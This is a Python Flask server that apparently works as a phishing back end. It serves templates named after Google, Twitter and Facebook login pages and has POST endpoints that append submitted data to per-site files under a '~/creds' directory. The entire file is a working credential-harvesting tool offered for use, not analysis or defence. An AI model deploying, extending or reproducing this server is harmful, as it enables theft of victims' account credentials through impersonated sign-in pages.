from flask import Flask, request, render_template, jsonify, redirect
import json
from os.path import expanduser

app = Flask(__name__)


@app.route('/google_client')
def google_page():
    return render_template('google.com.html')


@app.route('/twitter_client')
def twitter_page():
    return render_template('twitter.com.html')


@app.route('/facebook_client')
def facebook_page():
    return render_template('facebook.com.html')


@app.route('/google_cred', methods=['POST'])
def google_store_cred():
    data = request.data
    with open(expanduser("~") + '/creds/google.txt', 'a') as f:
        f.write(data.decode() + '\n')

    return ''


@app.route('/twitter_cred', methods=['POST'])
def twitter_store_cred():
    data = request.data
    with open(expanduser("~") + '/creds/twitter.txt', 'a') as f:
        f.write(data.decode() + '\n')

    return ''

@app.route('/facebook_cred', methods=['POST'])
def facebook_store_cred():
    data = request.data
    with open(expanduser("~") + '/creds/facebook.txt', 'a') as f:
        f.write(data.decode() + '\n')

    return ''




if __name__ == '__main__':
    app.run(host='0.0.0.0', port=2023, debug=False)
